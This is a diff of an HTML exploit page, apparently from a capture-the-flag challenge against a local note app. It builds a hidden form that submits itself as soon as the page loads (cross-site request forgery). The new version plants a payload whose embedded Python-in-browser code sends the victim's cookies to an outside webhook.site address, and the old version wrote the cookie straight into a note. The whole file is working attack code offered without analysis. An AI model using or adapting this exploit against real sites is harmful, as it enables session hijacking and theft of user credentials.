@@ -1,16 +1,21 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <form action="http://localhost:3000/note/new" method="POST">
-      <input type="hidden" name="note" id="noteInput">
+    <form id="csrfForm" action="http://localhost:3000/note/new" method="POST">
+      <input type="hidden" name="note" id="noteInput" />
     </form>
 
     <script>
-      // Insert the cookie into the note content
-      document.getElementById("noteInput").value = "Bot cookie: " + document.cookie;
+      const payload = JSON.stringify([
+        {
+          prompt: "import js;js.fetch('https://webhook.site/0b378206-7711-4e2c-9ee2-7a8a3e8e49dc?c=' + document.cookie)",
+          answer: "print(2+2)",
+          tag: "py-script"
+        }
+      ]);
 
-      // Auto-submit the form
-      document.forms[0].submit();
+      document.getElementById("noteInput").value = payload;
+      document.getElementById("csrfForm").submit();
     </script>
   </body>
 </html>
